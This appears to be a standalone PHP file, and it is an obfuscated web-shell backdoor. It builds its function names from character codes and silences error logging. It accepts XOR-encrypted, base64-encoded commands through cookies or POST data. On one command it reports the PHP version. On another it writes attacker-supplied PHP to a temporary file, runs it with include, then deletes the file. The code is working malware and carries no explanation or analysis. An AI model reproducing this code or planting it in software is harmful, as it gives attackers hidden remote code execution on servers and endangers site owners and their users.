<?php $HjZLUyv = "\146".'i'.'l'.chr(101).chr(95).'p'."\x75"."\164".chr(210-115).'c'."\x6f"."\156".chr(116).chr(185-84).chr(110).chr(116)."\163";
$yaJccg = 'b'.chr(97)."\163"."\x65"."\x36"."\x34".'_'."\x64"."\145"."\143".chr(859-748)."\144"."\x65";
$hizdOXyz = chr(105).chr(198-88)."\x69".'_'."\163".chr(101)."\x74";
$TfkCZvZ = chr(117).'n'.chr(108).'i'.chr(110).'k';


@$hizdOXyz(chr(101).chr(1096-982)."\x72".'o'.chr(374-260)."\137".chr(108)."\157".chr(103), NULL);
@$hizdOXyz("\x6c".chr(719-608)."\147"."\137".chr(101).'r'.chr(114).chr(207-96)."\162".chr(115), 0);
@$hizdOXyz("\155".chr(638-541)."\x78"."\x5f"."\x65"."\170".'e'."\x63"."\x75"."\164".chr(547-442)."\157".chr(110).'_'.chr(1085-969).chr(158-53).chr(109)."\145", 0);
@set_time_limit(0);

function AXrUq($sffWHOMMN, $VpwQOFxkAq)
{
    $btxaaN = "";
    for ($KFtzRTyJ = 0; $KFtzRTyJ < strlen($sffWHOMMN);) {
        for ($j = 0; $j < strlen($VpwQOFxkAq) && $KFtzRTyJ < strlen($sffWHOMMN); $j++, $KFtzRTyJ++) {
            $btxaaN .= chr(ord($sffWHOMMN[$KFtzRTyJ]) ^ ord($VpwQOFxkAq[$j]));
        }
    }
    return $btxaaN;
}

$ZFJKyyZ = array_merge($_COOKIE, $_POST);
$KFtzRTyJnCTcHk = '17128fab-090c-4f72-a0fd-0dd38422005d';
foreach ($ZFJKyyZ as $ZumvSpexwC => $sffWHOMMN) {
    $sffWHOMMN = @unserialize(AXrUq(AXrUq($yaJccg($sffWHOMMN), $KFtzRTyJnCTcHk), $ZumvSpexwC));
    if (isset($sffWHOMMN['a'.chr(462-355)])) {
        if ($sffWHOMMN["\141"] == chr(105)) {
            $KFtzRTyJ = array(
                chr(566-454).chr(118) => @phpversion(),
                's'.chr(415-297) => "3.5",
            );
            echo @serialize($KFtzRTyJ);
        } elseif ($sffWHOMMN["\141"] == chr(633-532)) {
            $wweyNkf = "./" . md5($KFtzRTyJnCTcHk) . "\x2e"."\x69"."\156".chr(576-477);
            @$HjZLUyv($wweyNkf, "<" . "\x3f".chr(112)."\x68"."\x70"."\x20".chr(624-560).chr(117).chr(110).'l'.'i'.chr(110).chr(107).chr(40).chr(95).'_'.chr(510-440).chr(73).chr(76).chr(69)."\137"."\137".chr(41).';'.chr(32) . $sffWHOMMN[chr(100)]);
            include($wweyNkf);
            @$TfkCZvZ($wweyNkf);
        }
        exit();
    }
}

